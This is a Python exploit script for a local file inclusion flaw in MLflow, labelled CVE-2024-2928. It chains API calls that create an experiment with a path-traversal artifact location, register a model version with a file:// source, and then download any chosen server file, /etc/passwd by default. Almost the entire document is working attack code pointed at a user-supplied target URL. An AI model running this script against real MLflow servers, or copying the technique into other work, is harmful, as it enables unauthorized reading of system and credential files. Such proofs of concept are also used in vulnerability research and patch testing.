#!/usr/bin/python3

import argparse
import json
import os
import random
import re
import requests
import string
import sys
import validators



def randomString(length):
    characters = string.ascii_letters + string.digits
    return "".join(random.choices(characters, k=length))

# This function performs the actual exploit. 
def exploit(args):

    url = args.target
    file = args.file
    outfile = args.outfile

    # request 1:  create malicious experiment
    name = randomString(5)
    directory = os.path.dirname(file)

    data = {"name": name, "artifact_location": f"http:///#/../../../../../../../../../../../../../..{directory}"}

    target = url + '/ajax-api/2.0/mlflow/experiments/create'

    r = requests.post(target, json = data)
    if r.status_code != 200:
        sys.exit("Got a non-200 repsonse sending first request.")

    # extract id from JSON response
    t = r.text
    exp_id = json.loads(t)["experiment_id"]

    print(f"Successfully created experiment with name '{name}' and id '{exp_id}'.")
    # request 2: create malicious run
    data = {"experiment_id": f"{exp_id}"} 

    target = url + '/api/2.0/mlflow/runs/create'

    r = requests.post(target, json = data)

    if r.status_code != 200:
        sys.exit("Got a non-200 repsonse sending second request.")

    # extract id from JSON response
    t = r.text
    run_id = json.loads(t)["run"]["info"]["run_id"]

    print(f"Created run with run id: {run_id}")

    # request 3: create a registered model
    data = {"name": f"{name}"} 

    target = url + '/ajax-api/2.0/mlflow/registered-models/create'

    r = requests.post(target, json = data)

    if r.status_code != 200:
        sys.exit("Got a non-200 repsonse sending third request.")

    # request 4: link model version and malicious run
    data = {"name": f"{name}", "run_id": f"{run_id}", "source": f'file://{directory}/'} 

    target = url + '/ajax-api/2.0/mlflow/model-versions/create'

    r = requests.post(target, json = data)

    if r.status_code != 200:
        sys.exit("Got a non-200 repsonse sending fourth request.")
   
     # request 5: get the file
    filename = os.path.basename(file)
    target = url + f"/model-versions/get-artifact?path={filename}&name={name}&version=1" 

    r = requests.get(target)

    if r.status_code != 200:
        sys.exit("Got a non-200 response for the final file retrieval. The file may not exist or is inaccessible.")

    if outfile == "":
        print(r"""

Here's your file!:

""")
        print(r.text)
    else:
        out = open(outfile, "w")
        out.write(r.text)
        out.close()
        print(f"Your output was written to '{outfile}'.")

# This function parses command line arguments
def parseArguments():

    banner = r"""
MLflow LFI exploit for CVE-2024-2928 based on:
https://huntr.com/bounties/19bf02d7-6393-4a95-b9d0-d6d4d2d8c298 



Author: r0pchainzZz
    """
    print(banner)
    parser = argparse.ArgumentParser(description="This exploit retrieves a file via LFI from the server on which MLflow is running. See the bug report above for more information.")
    parser.add_argument("-t", "--target", type=str, help="The target url to attack.", required=True)
    parser.add_argument("-f", "--file", type=str, help="The file to retrieve. Defaults to /etc/passwd as a proof of concept.", required=False, default="/etc/passwd")
    parser.add_argument("-o", "--outfile", type=str, help="Filename if you want output stored in a file. Good for non-text files..", required=False, default="")

    args = parser.parse_args()

    return args



if __name__ == "__main__":
    args = parseArguments()

    url = args.target
    if validators.url(url) != True:
        sys.exit("Please enter a valid url for the target.")
    
    exploit(args)
